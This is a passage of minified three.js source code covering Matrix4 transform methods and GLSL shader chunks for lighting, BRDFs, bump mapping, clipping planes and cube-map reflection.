this},makeScale:function(a,b,c){this.set(a,0,0,0,0,b,0,0,0,0,c,0,0,0,0,1);return this},makeShear:function(a,b,c){this.set(1,b,c,0,a,1,c,0,a,b,1,0,0,0,0,1);return this},compose:function(a,b,c){this.makeRotationFromQuaternion(b);this.scale(c);this.setPosition(a);\nreturn this},decompose:function(){var a,b;return function(c,d,e){void 0===a&&(a=new q,b=new S);var f=this.elements,g=a.set(f[0],f[1],f[2]).length(),h=a.set(f[4],f[5],f[6]).length(),m=a.set(f[8],f[9],f[10]).length();0>this.determinant()&&(g=-g);c.x=f[12];c.y=f[13];c.z=f[14];b.elements.set(this.elements);c=1/g;var f=1/h,k=1/m;b.elements[0]*=c;b.elements[1]*=c;b.elements[2]*=c;b.elements[4]*=f;b.elements[5]*=f;b.elements[6]*=f;b.elements[8]*=k;b.elements[9]*=k;b.elements[10]*=k;d.setFromRotationMatrix(b);\ne.x=g;e.y=h;e.z=m;return this}}(),makePerspective:function(a,b,c,d,e,f){void 0===f&&console.warn(\"THREE.Matrix4: .makePerspective() has been redefined and has a new signature. Please check the docs.\");var g=this.elements;g[0]=2*e/(b-a);g[4]=0;g[8]=(b+a)/(b-a);g[12]=0;g[1]=0;g[5]=2*e/(c-d);g[9]=(c+d)/(c-d);g[13]=0;g[2]=0;g[6]=0;g[10]=-(f+e)/(f-e);g[14]=-2*f*e/(f-e);g[3]=0;g[7]=0;g[11]=-1;g[15]=0;return this},makeOrthographic:function(a,b,c,d,e,f){var g=this.elements,h=1/(b-a),m=1/(c-d),k=1/(f-e);g[0]=\n2*h;g[4]=0;g[8]=0;g[12]=-((b+a)*h);g[1]=0;g[5]=2*m;g[9]=0;g[13]=-((c+d)*m);g[2]=0;g[6]=0;g[10]=-2*k;g[14]=-((f+e)*k);g[3]=0;g[7]=0;g[11]=0;g[15]=1;return this},equals:function(a){var b=this.elements;a=a.elements;for(var c=0;16>c;c++)if(b[c]!==a[c])return!1;return!0},fromArray:function(a,b){void 0===b&&(b=0);for(var c=0;16>c;c++)this.elements[c]=a[c+b];return this},toArray:function(a,b){void 0===a&&(a=[]);void 0===b&&(b=0);var c=this.elements;a[b]=c[0];a[b+1]=c[1];a[b+2]=c[2];a[b+3]=c[3];a[b+4]=c[4];\na[b+5]=c[5];a[b+6]=c[6];a[b+7]=c[7];a[b+8]=c[8];a[b+9]=c[9];a[b+10]=c[10];a[b+11]=c[11];a[b+12]=c[12];a[b+13]=c[13];a[b+14]=c[14];a[b+15]=c[15];return a}};Za.prototype=Object.create(ea.prototype);Za.prototype.constructor=Za;Za.prototype.isCubeTexture=!0;Object.defineProperty(Za.prototype,\"images\",{get:function(){return this.image},set:function(a){this.image=a}});var Ee=new ea,Fe=new Za,Be=[],De=[];Je.prototype.setValue=function(a,b){for(var c=this.seq,d=0,e=c.length;d!==e;++d){var f=c[d];f.setValue(a,\nb[f.id])}};var Rd=/([\\w\\d_]+)(\\])?(\\[|\\.)?/g;$a.prototype.setValue=function(a,b,c){b=this.map[b];void 0!==b&&b.setValue(a,c,this.renderer)};$a.prototype.set=function(a,b,c){var d=this.map[c];void 0!==d&&d.setValue(a,b[c],this.renderer)};$a.prototype.setOptional=function(a,b,c){b=b[c];void 0!==b&&this.setValue(a,c,b)};$a.upload=function(a,b,c,d){for(var e=0,f=b.length;e!==f;++e){var g=b[e],h=c[g.id];!1!==h.needsUpdate&&g.setValue(a,h.value,d)}};$a.seqWithValue=function(a,b){for(var c=[],d=0,e=a.length;d!==\ne;++d){var f=a[d];f.id in b&&c.push(f)}return c};var Ja={merge:function(a){for(var b={},c=0;c<a.length;c++){var d=this.clone(a[c]),e;for(e in d)b[e]=d[e]}return b},clone:function(a){var b={},c;for(c in a){b[c]={};for(var d in a[c]){var e=a[c][d];e&&(e.isColor||e.isMatrix3||e.isMatrix4||e.isVector2||e.isVector3||e.isVector4||e.isTexture)?b[c][d]=e.clone():Array.isArray(e)?b[c][d]=e.slice():b[c][d]=e}}return b}},Z={alphamap_fragment:\"#ifdef USE_ALPHAMAP\\n\\tdiffuseColor.a *= texture2D( alphaMap, vUv ).g;\\n#endif\\n\",\nalphamap_pars_fragment:\"#ifdef USE_ALPHAMAP\\n\\tuniform sampler2D alphaMap;\\n#endif\\n\",alphatest_fragment:\"#ifdef ALPHATEST\\n\\tif ( diffuseColor.a < ALPHATEST ) discard;\\n#endif\\n\",aomap_fragment:\"#ifdef USE_AOMAP\\n\\tfloat ambientOcclusion = ( texture2D( aoMap, vUv2 ).r - 1.0 ) * aoMapIntensity + 1.0;\\n\\treflectedLight.indirectDiffuse *= ambientOcclusion;\\n\\t#if defined( USE_ENVMAP ) && defined( PHYSICAL )\\n\\t\\tfloat dotNV = saturate( dot( geometry.normal, geometry.viewDir ) );\\n\\t\\treflectedLight.indirectSpecular *= computeSpecularOcclusion( dotNV, ambientOcclusion, material.specularRoughness );\\n\\t#endif\\n#endif\\n\",\naomap_pars_fragment:\"#ifdef USE_AOMAP\\n\\tuniform sampler2D aoMap;\\n\\tuniform float aoMapIntensity;\\n#endif\",begin_vertex:\"\\nvec3 transformed = vec3( position );\\n\",beginnormal_vertex:\"\\nvec3 objectNormal = vec3( normal );\\n\",bsdfs:\"float punctualLightIntensityToIrradianceFactor( const in float lightDistance, const in float cutoffDistance, const in float decayExponent ) {\\n\\t\\tif( decayExponent > 0.0 ) {\\n#if defined ( PHYSICALLY_CORRECT_LIGHTS )\\n\\t\\t\\tfloat distanceFalloff = 1.0 / max( pow( lightDistance, decayExponent ), 0.01 );\\n\\t\\t\\tfloat maxDistanceCutoffFactor = pow2( saturate( 1.0 - pow4( lightDistance / cutoffDistance ) ) );\\n\\t\\t\\treturn distanceFalloff * maxDistanceCutoffFactor;\\n#else\\n\\t\\t\\treturn pow( saturate( -lightDistance / cutoffDistance + 1.0 ), decayExponent );\\n#endif\\n\\t\\t}\\n\\t\\treturn 1.0;\\n}\\nvec3 BRDF_Diffuse_Lambert( const in vec3 diffuseColor ) {\\n\\treturn RECIPROCAL_PI * diffuseColor;\\n}\\nvec3 F_Schlick( const in vec3 specularColor, const in float dotLH ) {\\n\\tfloat fresnel = exp2( ( -5.55473 * dotLH - 6.98316 ) * dotLH );\\n\\treturn ( 1.0 - specularColor ) * fresnel + specularColor;\\n}\\nfloat G_GGX_Smith( const in float alpha, const in float dotNL, const in float dotNV ) {\\n\\tfloat a2 = pow2( alpha );\\n\\tfloat gl = dotNL + sqrt( a2 + ( 1.0 - a2 ) * pow2( dotNL ) );\\n\\tfloat gv = dotNV + sqrt( a2 + ( 1.0 - a2 ) * pow2( dotNV ) );\\n\\treturn 1.0 / ( gl * gv );\\n}\\nfloat G_GGX_SmithCorrelated( const in float alpha, const in float dotNL, const in float dotNV ) {\\n\\tfloat a2 = pow2( alpha );\\n\\tfloat gv = dotNL * sqrt( a2 + ( 1.0 - a2 ) * pow2( dotNV ) );\\n\\tfloat gl = dotNV * sqrt( a2 + ( 1.0 - a2 ) * pow2( dotNL ) );\\n\\treturn 0.5 / max( gv + gl, EPSILON );\\n}\\nfloat D_GGX( const in float alpha, const in float dotNH ) {\\n\\tfloat a2 = pow2( alpha );\\n\\tfloat denom = pow2( dotNH ) * ( a2 - 1.0 ) + 1.0;\\n\\treturn RECIPROCAL_PI * a2 / pow2( denom );\\n}\\nvec3 BRDF_Specular_GGX( const in IncidentLight incidentLight, const in GeometricContext geometry, const in vec3 specularColor, const in float roughness ) {\\n\\tfloat alpha = pow2( roughness );\\n\\tvec3 halfDir = normalize( incidentLight.direction + geometry.viewDir );\\n\\tfloat dotNL = saturate( dot( geometry.normal, incidentLight.direction ) );\\n\\tfloat dotNV = saturate( dot( geometry.normal, geometry.viewDir ) );\\n\\tfloat dotNH = saturate( dot( geometry.normal, halfDir ) );\\n\\tfloat dotLH = saturate( dot( incidentLight.direction, halfDir ) );\\n\\tvec3 F = F_Schlick( specularColor, dotLH );\\n\\tfloat G = G_GGX_SmithCorrelated( alpha, dotNL, dotNV );\\n\\tfloat D = D_GGX( alpha, dotNH );\\n\\treturn F * ( G * D );\\n}\\nvec2 ltcTextureCoords( const in GeometricContext geometry, const in float roughness ) {\\n\\tconst float LUT_SIZE  = 64.0;\\n\\tconst float LUT_SCALE = (LUT_SIZE - 1.0)/LUT_SIZE;\\n\\tconst float LUT_BIAS  = 0.5/LUT_SIZE;\\n\\tvec3 N = geometry.normal;\\n\\tvec3 V = geometry.viewDir;\\n\\tvec3 P = geometry.position;\\n\\tfloat theta = acos( dot( N, V ) );\\n\\tvec2 uv = vec2(\\n\\t\\tsqrt( saturate( roughness ) ),\\n\\t\\tsaturate( theta / ( 0.5 * PI ) ) );\\n\\tuv = uv * LUT_SCALE + LUT_BIAS;\\n\\treturn uv;\\n}\\nvoid clipQuadToHorizon( inout vec3 L[5], out int n ) {\\n\\tint config = 0;\\n\\tif ( L[0].z > 0.0 ) config += 1;\\n\\tif ( L[1].z > 0.0 ) config += 2;\\n\\tif ( L[2].z > 0.0 ) config += 4;\\n\\tif ( L[3].z > 0.0 ) config += 8;\\n\\tn = 0;\\n\\tif ( config == 0 ) {\\n\\t} else if ( config == 1 ) {\\n\\t\\tn = 3;\\n\\t\\tL[1] = -L[1].z * L[0] + L[0].z * L[1];\\n\\t\\tL[2] = -L[3].z * L[0] + L[0].z * L[3];\\n\\t} else if ( config == 2 ) {\\n\\t\\tn = 3;\\n\\t\\tL[0] = -L[0].z * L[1] + L[1].z * L[0];\\n\\t\\tL[2] = -L[2].z * L[1] + L[1].z * L[2];\\n\\t} else if ( config == 3 ) {\\n\\t\\tn = 4;\\n\\t\\tL[2] = -L[2].z * L[1] + L[1].z * L[2];\\n\\t\\tL[3] = -L[3].z * L[0] + L[0].z * L[3];\\n\\t} else if ( config == 4 ) {\\n\\t\\tn = 3;\\n\\t\\tL[0] = -L[3].z * L[2] + L[2].z * L[3];\\n\\t\\tL[1] = -L[1].z * L[2] + L[2].z * L[1];\\n\\t} else if ( config == 5 ) {\\n\\t\\tn = 0;\\n\\t} else if ( config == 6 ) {\\n\\t\\tn = 4;\\n\\t\\tL[0] = -L[0].z * L[1] + L[1].z * L[0];\\n\\t\\tL[3] = -L[3].z * L[2] + L[2].z * L[3];\\n\\t} else if ( config == 7 ) {\\n\\t\\tn = 5;\\n\\t\\tL[4] = -L[3].z * L[0] + L[0].z * L[3];\\n\\t\\tL[3] = -L[3].z * L[2] + L[2].z * L[3];\\n\\t} else if ( config == 8 ) {\\n\\t\\tn = 3;\\n\\t\\tL[0] = -L[0].z * L[3] + L[3].z * L[0];\\n\\t\\tL[1] = -L[2].z * L[3] + L[3].z * L[2];\\n\\t\\tL[2] =  L[3];\\n\\t} else if ( config == 9 ) {\\n\\t\\tn = 4;\\n\\t\\tL[1] = -L[1].z * L[0] + L[0].z * L[1];\\n\\t\\tL[2] = -L[2].z * L[3] + L[3].z * L[2];\\n\\t} else if ( config == 10 ) {\\n\\t\\tn = 0;\\n\\t} else if ( config == 11 ) {\\n\\t\\tn = 5;\\n\\t\\tL[4] = L[3];\\n\\t\\tL[3] = -L[2].z * L[3] + L[3].z * L[2];\\n\\t\\tL[2] = -L[2].z * L[1] + L[1].z * L[2];\\n\\t} else if ( config == 12 ) {\\n\\t\\tn = 4;\\n\\t\\tL[1] = -L[1].z * L[2] + L[2].z * L[1];\\n\\t\\tL[0] = -L[0].z * L[3] + L[3].z * L[0];\\n\\t} else if ( config == 13 ) {\\n\\t\\tn = 5;\\n\\t\\tL[4] = L[3];\\n\\t\\tL[3] = L[2];\\n\\t\\tL[2] = -L[1].z * L[2] + L[2].z * L[1];\\n\\t\\tL[1] = -L[1].z * L[0] + L[0].z * L[1];\\n\\t} else if ( config == 14 ) {\\n\\t\\tn = 5;\\n\\t\\tL[4] = -L[0].z * L[3] + L[3].z * L[0];\\n\\t\\tL[0] = -L[0].z * L[1] + L[1].z * L[0];\\n\\t} else if ( config == 15 ) {\\n\\t\\tn = 4;\\n\\t}\\n\\tif ( n == 3 )\\n\\t\\tL[3] = L[0];\\n\\tif ( n == 4 )\\n\\t\\tL[4] = L[0];\\n}\\nfloat integrateLtcBrdfOverRectEdge( vec3 v1, vec3 v2 ) {\\n\\tfloat cosTheta = dot( v1, v2 );\\n\\tfloat theta = acos( cosTheta );\\n\\tfloat res = cross( v1, v2 ).z * ( ( theta > 0.001 ) ? theta / sin( theta ) : 1.0 );\\n\\treturn res;\\n}\\nvoid initRectPoints( const in vec3 pos, const in vec3 halfWidth, const in vec3 halfHeight, out vec3 rectPoints[4] ) {\\n\\trectPoints[0] = pos - halfWidth - halfHeight;\\n\\trectPoints[1] = pos + halfWidth - halfHeight;\\n\\trectPoints[2] = pos + halfWidth + halfHeight;\\n\\trectPoints[3] = pos - halfWidth + halfHeight;\\n}\\nvec3 integrateLtcBrdfOverRect( const in GeometricContext geometry, const in mat3 brdfMat, const in vec3 rectPoints[4] ) {\\n\\tvec3 N = geometry.normal;\\n\\tvec3 V = geometry.viewDir;\\n\\tvec3 P = geometry.position;\\n\\tvec3 T1, T2;\\n\\tT1 = normalize(V - N * dot( V, N ));\\n\\tT2 = - cross( N, T1 );\\n\\tmat3 brdfWrtSurface = brdfMat * transpose( mat3( T1, T2, N ) );\\n\\tvec3 clippedRect[5];\\n\\tclippedRect[0] = brdfWrtSurface * ( rectPoints[0] - P );\\n\\tclippedRect[1] = brdfWrtSurface * ( rectPoints[1] - P );\\n\\tclippedRect[2] = brdfWrtSurface * ( rectPoints[2] - P );\\n\\tclippedRect[3] = brdfWrtSurface * ( rectPoints[3] - P );\\n\\tint n;\\n\\tclipQuadToHorizon(clippedRect, n);\\n\\tif ( n == 0 )\\n\\t\\treturn vec3( 0, 0, 0 );\\n\\tclippedRect[0] = normalize( clippedRect[0] );\\n\\tclippedRect[1] = normalize( clippedRect[1] );\\n\\tclippedRect[2] = normalize( clippedRect[2] );\\n\\tclippedRect[3] = normalize( clippedRect[3] );\\n\\tclippedRect[4] = normalize( clippedRect[4] );\\n\\tfloat sum = 0.0;\\n\\tsum += integrateLtcBrdfOverRectEdge( clippedRect[0], clippedRect[1] );\\n\\tsum += integrateLtcBrdfOverRectEdge( clippedRect[1], clippedRect[2] );\\n\\tsum += integrateLtcBrdfOverRectEdge( clippedRect[2], clippedRect[3] );\\n\\tif (n >= 4)\\n\\t\\tsum += integrateLtcBrdfOverRectEdge( clippedRect[3], clippedRect[4] );\\n\\tif (n == 5)\\n\\t\\tsum += integrateLtcBrdfOverRectEdge( clippedRect[4], clippedRect[0] );\\n\\tsum = max( 0.0, sum );\\n\\tvec3 Lo_i = vec3( sum, sum, sum );\\n\\treturn Lo_i;\\n}\\nvec3 Rect_Area_Light_Specular_Reflectance(\\n\\t\\tconst in GeometricContext geometry,\\n\\t\\tconst in vec3 lightPos, const in vec3 lightHalfWidth, const in vec3 lightHalfHeight,\\n\\t\\tconst in float roughness,\\n\\t\\tconst in sampler2D ltcMat, const in sampler2D ltcMag ) {\\n\\tvec3 rectPoints[4];\\n\\tinitRectPoints( lightPos, lightHalfWidth, lightHalfHeight, rectPoints );\\n\\tvec2 uv = ltcTextureCoords( geometry, roughness );\\n\\tvec4 brdfLtcApproxParams, t;\\n\\tbrdfLtcApproxParams = texture2D( ltcMat, uv );\\n\\tt = texture2D( ltcMat, uv );\\n\\tfloat brdfLtcScalar = texture2D( ltcMag, uv ).a;\\n\\tmat3 brdfLtcApproxMat = mat3(\\n\\t\\tvec3(   1,   0, t.y ),\\n\\t\\tvec3(   0, t.z,   0 ),\\n\\t\\tvec3( t.w,   0, t.x )\\n\\t);\\n\\tvec3 specularReflectance = integrateLtcBrdfOverRect( geometry, brdfLtcApproxMat, rectPoints );\\n\\tspecularReflectance *= brdfLtcScalar;\\n\\treturn specularReflectance;\\n}\\nvec3 Rect_Area_Light_Diffuse_Reflectance(\\n\\t\\tconst in GeometricContext geometry,\\n\\t\\tconst in vec3 lightPos, const in vec3 lightHalfWidth, const in vec3 lightHalfHeight ) {\\n\\tvec3 rectPoints[4];\\n\\tinitRectPoints( lightPos, lightHalfWidth, lightHalfHeight, rectPoints );\\n\\tmat3 diffuseBrdfMat = mat3(1);\\n\\tvec3 diffuseReflectance = integrateLtcBrdfOverRect( geometry, diffuseBrdfMat, rectPoints );\\n\\treturn diffuseReflectance;\\n}\\nvec3 BRDF_Specular_GGX_Environment( const in GeometricContext geometry, const in vec3 specularColor, const in float roughness ) {\\n\\tfloat dotNV = saturate( dot( geometry.normal, geometry.viewDir ) );\\n\\tconst vec4 c0 = vec4( - 1, - 0.0275, - 0.572, 0.022 );\\n\\tconst vec4 c1 = vec4( 1, 0.0425, 1.04, - 0.04 );\\n\\tvec4 r = roughness * c0 + c1;\\n\\tfloat a004 = min( r.x * r.x, exp2( - 9.28 * dotNV ) ) * r.x + r.y;\\n\\tvec2 AB = vec2( -1.04, 1.04 ) * a004 + r.zw;\\n\\treturn specularColor * AB.x + AB.y;\\n}\\nfloat G_BlinnPhong_Implicit( ) {\\n\\treturn 0.25;\\n}\\nfloat D_BlinnPhong( const in float shininess, const in float dotNH ) {\\n\\treturn RECIPROCAL_PI * ( shininess * 0.5 + 1.0 ) * pow( dotNH, shininess );\\n}\\nvec3 BRDF_Specular_BlinnPhong( const in IncidentLight incidentLight, const in GeometricContext geometry, const in vec3 specularColor, const in float shininess ) {\\n\\tvec3 halfDir = normalize( incidentLight.direction + geometry.viewDir );\\n\\tfloat dotNH = saturate( dot( geometry.normal, halfDir ) );\\n\\tfloat dotLH = saturate( dot( incidentLight.direction, halfDir ) );\\n\\tvec3 F = F_Schlick( specularColor, dotLH );\\n\\tfloat G = G_BlinnPhong_Implicit( );\\n\\tfloat D = D_BlinnPhong( shininess, dotNH );\\n\\treturn F * ( G * D );\\n}\\nfloat GGXRoughnessToBlinnExponent( const in float ggxRoughness ) {\\n\\treturn ( 2.0 / pow2( ggxRoughness + 0.0001 ) - 2.0 );\\n}\\nfloat BlinnExponentToGGXRoughness( const in float blinnExponent ) {\\n\\treturn sqrt( 2.0 / ( blinnExponent + 2.0 ) );\\n}\\n\",\nbumpmap_pars_fragment:\"#ifdef USE_BUMPMAP\\n\\tuniform sampler2D bumpMap;\\n\\tuniform float bumpScale;\\n\\tvec2 dHdxy_fwd() {\\n\\t\\tvec2 dSTdx = dFdx( vUv );\\n\\t\\tvec2 dSTdy = dFdy( vUv );\\n\\t\\tfloat Hll = bumpScale * texture2D( bumpMap, vUv ).x;\\n\\t\\tfloat dBx = bumpScale * texture2D( bumpMap, vUv + dSTdx ).x - Hll;\\n\\t\\tfloat dBy = bumpScale * texture2D( bumpMap, vUv + dSTdy ).x - Hll;\\n\\t\\treturn vec2( dBx, dBy );\\n\\t}\\n\\tvec3 perturbNormalArb( vec3 surf_pos, vec3 surf_norm, vec2 dHdxy ) {\\n\\t\\tvec3 vSigmaX = dFdx( surf_pos );\\n\\t\\tvec3 vSigmaY = dFdy( surf_pos );\\n\\t\\tvec3 vN = surf_norm;\\n\\t\\tvec3 R1 = cross( vSigmaY, vN );\\n\\t\\tvec3 R2 = cross( vN, vSigmaX );\\n\\t\\tfloat fDet = dot( vSigmaX, R1 );\\n\\t\\tvec3 vGrad = sign( fDet ) * ( dHdxy.x * R1 + dHdxy.y * R2 );\\n\\t\\treturn normalize( abs( fDet ) * surf_norm - vGrad );\\n\\t}\\n#endif\\n\",\nclipping_planes_fragment:\"#if NUM_CLIPPING_PLANES > 0\\n\\tfor ( int i = 0; i < UNION_CLIPPING_PLANES; ++ i ) {\\n\\t\\tvec4 plane = clippingPlanes[ i ];\\n\\t\\tif ( dot( vViewPosition, plane.xyz ) > plane.w ) discard;\\n\\t}\\n\\t\\t\\n\\t#if UNION_CLIPPING_PLANES < NUM_CLIPPING_PLANES\\n\\t\\tbool clipped = true;\\n\\t\\tfor ( int i = UNION_CLIPPING_PLANES; i < NUM_CLIPPING_PLANES; ++ i ) {\\n\\t\\t\\tvec4 plane = clippingPlanes[ i ];\\n\\t\\t\\tclipped = ( dot( vViewPosition, plane.xyz ) > plane.w ) && clipped;\\n\\t\\t}\\n\\t\\tif ( clipped ) discard;\\n\\t\\n\\t#endif\\n#endif\\n\",\nclipping_planes_pars_fragment:\"#if NUM_CLIPPING_PLANES > 0\\n\\t#if ! defined( PHYSICAL ) && ! defined( PHONG )\\n\\t\\tvarying vec3 vViewPosition;\\n\\t#endif\\n\\tuniform vec4 clippingPlanes[ NUM_CLIPPING_PLANES ];\\n#endif\\n\",clipping_planes_pars_vertex:\"#if NUM_CLIPPING_PLANES > 0 && ! defined( PHYSICAL ) && ! defined( PHONG )\\n\\tvarying vec3 vViewPosition;\\n#endif\\n\",clipping_planes_vertex:\"#if NUM_CLIPPING_PLANES > 0 && ! defined( PHYSICAL ) && ! defined( PHONG )\\n\\tvViewPosition = - mvPosition.xyz;\\n#endif\\n\",\ncolor_fragment:\"#ifdef USE_COLOR\\n\\tdiffuseColor.rgb *= vColor;\\n#endif\",color_pars_fragment:\"#ifdef USE_COLOR\\n\\tvarying vec3 vColor;\\n#endif\\n\",color_pars_vertex:\"#ifdef USE_COLOR\\n\\tvarying vec3 vColor;\\n#endif\",color_vertex:\"#ifdef USE_COLOR\\n\\tvColor.xyz = color.xyz;\\n#endif\",common:\"#define PI 3.14159265359\\n#define PI2 6.28318530718\\n#define PI_HALF 1.5707963267949\\n#define RECIPROCAL_PI 0.31830988618\\n#define RECIPROCAL_PI2 0.15915494\\n#define LOG2 1.442695\\n#define EPSILON 1e-6\\n#define saturate(a) clamp( a, 0.0, 1.0 )\\n#define whiteCompliment(a) ( 1.0 - saturate( a ) )\\nfloat pow2( const in float x ) { return x*x; }\\nfloat pow3( const in float x ) { return x*x*x; }\\nfloat pow4( const in float x ) { float x2 = x*x; return x2*x2; }\\nfloat average( const in vec3 color ) { return dot( color, vec3( 0.3333 ) ); }\\nhighp float rand( const in vec2 uv ) {\\n\\tconst highp float a = 12.9898, b = 78.233, c = 43758.5453;\\n\\thighp float dt = dot( uv.xy, vec2( a,b ) ), sn = mod( dt, PI );\\n\\treturn fract(sin(sn) * c);\\n}\\nstruct IncidentLight {\\n\\tvec3 color;\\n\\tvec3 direction;\\n\\tbool visible;\\n};\\nstruct ReflectedLight {\\n\\tvec3 directDiffuse;\\n\\tvec3 directSpecular;\\n\\tvec3 indirectDiffuse;\\n\\tvec3 indirectSpecular;\\n};\\nstruct GeometricContext {\\n\\tvec3 position;\\n\\tvec3 normal;\\n\\tvec3 viewDir;\\n};\\nvec3 transformDirection( in vec3 dir, in mat4 matrix ) {\\n\\treturn normalize( ( matrix * vec4( dir, 0.0 ) ).xyz );\\n}\\nvec3 inverseTransformDirection( in vec3 dir, in mat4 matrix ) {\\n\\treturn normalize( ( vec4( dir, 0.0 ) * matrix ).xyz );\\n}\\nvec3 projectOnPlane(in vec3 point, in vec3 pointOnPlane, in vec3 planeNormal ) {\\n\\tfloat distance = dot( planeNormal, point - pointOnPlane );\\n\\treturn - distance * planeNormal + point;\\n}\\nfloat sideOfPlane( in vec3 point, in vec3 pointOnPlane, in vec3 planeNormal ) {\\n\\treturn sign( dot( point - pointOnPlane, planeNormal ) );\\n}\\nvec3 linePlaneIntersect( in vec3 pointOnLine, in vec3 lineDirection, in vec3 pointOnPlane, in vec3 planeNormal ) {\\n\\treturn lineDirection * ( dot( planeNormal, pointOnPlane - pointOnLine ) / dot( planeNormal, lineDirection ) ) + pointOnLine;\\n}\\nmat3 transpose( const in mat3 v ) {\\n\\tmat3 tmp;\\n\\ttmp[0] = vec3(v[0].x, v[1].x, v[2].x);\\n\\ttmp[1] = vec3(v[0].y, v[1].y, v[2].y);\\n\\ttmp[2] = vec3(v[0].z, v[1].z, v[2].z);\\n\\treturn tmp;\\n}\\n\",\ncube_uv_reflection_fragment:\"#ifdef ENVMAP_TYPE_CUBE_UV\\n#define cubeUV_textureSize (1024.0)\\nint getFaceFromDirection(vec3 direction) {\\n\\tvec3 absDirection = abs(direction);\\n\\tint face = -1;\\n\\tif( absDirection.x > absDirection.z ) {\\n\\t\\tif(absDirection.x > absDirection.y )\\n\\t\\t\\tface = direction.x > 0.0 ? 0 : 3;\\n\\t\\telse\\n\\t\\t\\tface = direction.y > 0.0 ? 1 : 4;\\n\\t}\\n\\telse {\\n\\t\\tif(absDirection.z > absDirection.y )\\n\\t\\t\\tface = direction.z > 0.0 ? 2 : 5;\\n\\t\\telse\\n\\t\\t\\tface = direction.y > 0.0 ? 1 : 4;\\n\\t}\\n\\treturn face;\\n}\\n#define cubeUV_maxLods1  (log2(cubeUV_textureSize*0.25) - 1.0)\\n#define cubeUV_rangeClamp (exp2((6.0 - 1.0) * 2.0))\\nvec2 MipLevelInfo( vec3 vec, float roughnessLevel, float roughness ) {\\n\\tfloat scale = exp2(cubeUV_maxLods1 - roughnessLevel);\\n\\tfloat dxRoughness = dFdx(roughness);\\n\\tfloat dyRoughness = dFdy(roughness);\\n\\tvec3 dx = dFdx( vec * scale * dxRoughness );\\n\\tvec3 dy = dFdy( vec * scale * dyRoughness );\\n\\tfloat d = max( dot( dx, dx ), dot( dy, dy ) );\\n\\td = clamp(d, 1.0, cubeUV_rangeClamp);\\n\\tfloat mipLevel = 0.5 * log2(d);\\n\\treturn vec2(floor(mipLevel), fract(mipLevel));\\n}\\n#define cubeUV_maxLods2 (log2(cubeUV_textureSize*0.25) - 2.0)\\n#define cubeUV_rcpTextureSize (1.0 / cubeUV_textureSize)\\nvec2 getCubeUV(vec3 direction, float roughnessLevel, float mipLevel) {\\n\\tmipLevel = roughnessLevel > cubeUV_maxLods2 - 3.0 ? 0.0 : mipLevel;\\n\\tfloat a = 16.0 * cubeUV_rcpTextureSize;\\n\\tvec2 exp2_packed = exp2( vec2( roughnessLevel, mipLevel ) );\\n\\tvec2 rcp_exp2_packed = vec2( 1.0 ) / exp2_packed;\\n\\tfloat powScale = exp2_packed.x * exp2_packed.y;\\n\\tfloat scale = rcp_exp2_packed.x * rcp_exp2_packed.y * 0.25;\\n\\tfloat mipOffset = 0.75*(1.0 - rcp_exp2_packed.y) * rcp_exp2_packed.x;\\n\\tbool bRes = mipLevel == 0.0;\\n\\tscale =  bRes && (scale < a) ? a : scale;\\n\\tvec3 r;\\n\\tvec2 offset;\\n\\tint face = getFaceFromDirection(direction);\\n\\tfloat rcpPowScale = 1.0 / powScale;\\n\\tif( face == 0) {\\n\\t\\tr = vec3(direction.x, -direction.z, direction.y);\\n\\t\\toffset = vec2(0.0+mipOffset,0.75 * rcpPowScale);\\n\\t\\toffset.y = bRes && (offset.y < 2.0*a) ? a : offset.y;\\n\\t}\\n\\telse if( face == 1) {\\n\\t\\tr = vec3(direction.y, direction.x, direction.z);\\n\\t\\toffset = vec2(scale+mipOffset, 0.75 * rcpPowScale);\\n\\t\\toffset.y = bRes && (offset.y < 2.0*a) ? a : offset.y;\\n\\t}\\n\\telse if( face == 2) {\\n\\t\\tr = vec3(direction.z, direction.x, direction.y);\\n\\t\\toffset = vec2(2.0*scale+mipOffset, 0.75 * rcpPowScale);\\n\\t\\toffset.y = bRes && (offset.y < 2.0*a) ? a : offset.y;\\n\\t}\\n\\telse if( face == 3) {\\n\\t\\tr = vec3(direction.x, direction.z, direction.y);\\n\\t\\toffset = vec2(0.0+mipOffset,0.5 * rcpPowScale);\\n\\t\\toffset.y = bRes && (offset.y < 2.0*a) ? 0.0 : offset.y;\\n\\t}\\n\\telse if( face == 4) {\\n\\t\\tr = vec3(direction.y, direction.x, -direction.z);\\n\\t\\toffset = vec2(scale+mipOffset, 0.5 * rcpPowScale);\\n\\t\\toffset.y = bRes && (offset.y < 2.0*a) ? 0.0 : offset.y;\\n\\t}\\n\\telse {\\n\\t\\tr = vec3(direction.z, -direction.x, direction.y);\\n\\t\\toffset = vec2(2.0*scale+mipOffset, 0.5 * rcpPowScale);\\n\\t\\toffset.y = bRes && (offset.y < 2.0*a) ? 0.0 : offset.y;\\n\\t}\\n\\tr = normalize(r);\\n\\tfloat texelOffset = 0.5 * cubeUV_rcpTextureSize;\\n\\tvec2 s = ( r.yz / abs( r.x ) + vec2( 1.0 ) ) * 0.5;\\n\\tvec2 base = offset + vec2( texelOffset );\\n\\treturn base + s * ( scale - 2.0 * texelOffset );\\n}\\n#define cubeUV_maxLods3 (log2(cubeUV_textureSize*0.25) - 3.0)\\nvec4 textureCubeUV(vec3 reflectedDirection, float roughness ) {\\n\\tfloat roughnessVal = roughness* cubeUV_maxLods3;\\n\\tfloat r1 = floor(roughnessVal);\\n\\tfloat r2 = r1 + 1.0;\\n\\tfloat t = fract(roughnessVal);\\n\\tvec2 mipInfo = MipLevelInfo(reflectedDirection, r1, roughness);\\n\\tfloat s = mipInfo.y;\\n\\tfloat level0 = mipInfo.x;\\n\\tfloat level1 = level0 + 1.0;\\n\\tlevel1 = level1 > 5.0 ? 5.0 : level1;\\n\\tlevel0 += min( floor( s + 0.5 ), 5.0 );\\n\\tvec2 uv_10 = getCubeUV(reflectedDirection, r1, level0);\\n\\tvec4 color10 = envMapTexelToLinear(texture2D(envMap, uv_10));\\n\\tvec2 uv_20 = getCubeUV(reflectedDirection, r2, level0);\\n\\tvec4 color20 = envMapTexelToLinear(texture2D(envMap, uv_20));\\n\\tvec4 result = mix(color10, color20, t);\\n\\treturn vec4(result.rgb, 1.0);\\n}\\n#endif\\n\",\ndefaultnormal_vertex:\"#ifdef FLIP_SIDED\\n\\tobjectNormal = -objectNormal;\\n#endif\\nvec3 transformedNormal = normalMatrix * objectNormal;\\n\",displacementmap_pars_vertex:\"#ifdef USE_DISPLACEMENTMAP\\n\\tuniform sampler2D displacementMap;\\n\\tuniform float displacementScale;\\n\\tuniform float displacementBias;\\n#endif\\n\",displacementmap_vertex:\"#ifdef 